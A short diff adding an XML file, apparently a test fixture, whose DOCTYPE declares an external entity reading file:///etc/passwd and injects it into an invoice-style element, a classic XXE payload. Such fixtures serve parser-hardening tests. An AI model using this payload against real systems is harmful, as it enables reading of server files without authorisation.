@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<HDon><DLHDon><TTChung><SHDon>&xxe;</SHDon></TTChung></DLHDon></HDon>
